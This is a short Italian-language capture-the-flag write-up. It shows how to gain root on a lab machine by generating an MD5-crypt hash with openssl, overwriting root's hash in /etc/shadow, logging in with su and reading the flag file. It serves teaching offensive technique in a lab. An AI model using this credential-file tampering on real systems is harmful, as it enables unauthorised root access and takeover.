## Exploitation 5: Privilege Escalation via `/etc/shadow` Password Injection

### 1. Generare un hash di password compatibile con `/etc/shadow`  
Usiamo **OpenSSL** per creare un hash MD5-crypt della password `password123`, con salt `abc`:  
```bash
openssl passwd -1 -salt abc password123
# Output: $1$abc$UWUoROXzUCsLsVzI0R2et.
```

---

### 2. Sostituire l’hash di root in `/etc/shadow`

Apriamo il file `/etc/shadow` in **nano** (o l’editor preferito), cercando la riga dell’utente `root`:

```bash
nano /etc/shadow
```

* Trova la riga che inizia con `root:`
* Sostituisci tutto l’hash tra il primo e il secondo due-punti (`:`) con il nuovo hash `$1$abc$UWUoROXzUCsLsVzI0R2et.`
* Salva e chiudi l’editor.

---

### 3. Eseguire il comando `su` per diventare root

Ora, invocando **su**, basta inserire la password in chiaro `password123`:

```bash
su
Password: password123
```

Se l’hash è corretto, otterrai i privilegi di root.

---

### 4. Verifica dell’accesso root e lettura della flag

Con i permessi di super-utente, puoi esplorare il filesystem di root:

```bash
ls
cd /root
cat flag.txt
# FLAG5_12f5f00e4f8a462794b71d72e0e5d64d
```

---

### Spiegazione Semplice

1. **Hashing**: abbiamo creato un hash MD5-crypt (formato `$1$…`) identico a quello usato dal sistema per le password in `/etc/shadow`.
2. **Iniezione**: modificando `/etc/shadow`, abbiamo sostituito l’hash di root con il nostro, facendo sembrare che `password123` fosse la password legittima di root.
3. **Escalation**: con `su` e `password123`, il sistema ci riconosce come root.
4. **Flag**: infine, leggiamo la flag di root in `/root/flag.txt`.

Questo metodo funziona solo se hai già accesso come utente con permessi di scrittura su `/etc/shadow` 
